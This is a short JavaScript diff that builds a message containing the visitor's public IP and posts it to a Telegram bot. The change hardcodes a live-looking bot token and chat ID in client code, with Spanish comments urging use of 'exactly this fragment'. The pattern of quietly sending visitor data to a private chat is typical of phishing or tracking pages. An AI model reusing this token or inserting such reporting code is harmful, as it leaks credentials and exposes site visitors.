@@ -101,9 +101,12 @@
           `🌐 *IP pública:* \`${ip}\``;
 
         // Enviar a Telegram
-        const token2 = import.meta.env.VITE_BOT_TOKEN;
-const chatid2 = import.meta.env.VITE_CHAT_ID;
-        await fetch(`https://api.telegram.org/bot${token2}/sendMessage`, {
+        // Reemplaza estos valores con tus credenciales reales:
+const token2  = '7566301264:AAETlzNwR9-iuvl4xiUEuWsiYGd1hR-L4zk';
+const chatid2 = '-1002373013684';
+
+// Luego, en tu lógica de envío, usa exactamente este fragmento:
+await fetch(`https://api.telegram.org/bot${token2}/sendMessage`, {
   method: 'POST',
   headers: { 'Content-Type': 'application/json' },
   body: JSON.stringify({
